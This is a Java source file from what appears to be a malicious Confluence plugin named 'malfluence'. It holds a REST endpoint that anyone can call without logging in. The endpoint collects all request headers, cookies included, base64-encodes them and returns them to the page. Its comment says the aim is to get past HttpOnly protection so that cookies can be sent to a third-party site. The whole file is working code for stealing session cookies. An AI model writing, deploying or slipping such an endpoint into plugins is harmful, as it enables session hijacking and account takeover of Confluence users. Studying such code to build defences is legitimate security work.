package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Log;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.core.Context;
import javax.ws.rs.core.HttpHeaders;
import javax.ws.rs.core.Response;
import java.util.Base64;

// Since cookies are protected by HttpOnly, we send them to this endpoint and return them into the DOM to send them away to a third party site
// GET /maintenance/getheaders
@Path("/getheaders")
public class HeaderReflect {
    @GET
    @AnonymousAllowed
    public Response ReflectHeaders(@Context HttpHeaders httpHeaders) {
        try {
            StringBuilder stringBuilder = new StringBuilder();

            // Assemble all the headers into one string
            for (String name : httpHeaders.getRequestHeaders().keySet()) {
                String value = httpHeaders.getRequestHeader(name).toString();
                stringBuilder.append(String.format("%s:%s\n", name, value));
            }

            // base64 encode string
            String b64headers = Base64.getEncoder().encodeToString(stringBuilder.toString().getBytes());

            // Return the response
            return Response
                    .status(Response.Status.OK)
                    .entity(b64headers)
                    .build();

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}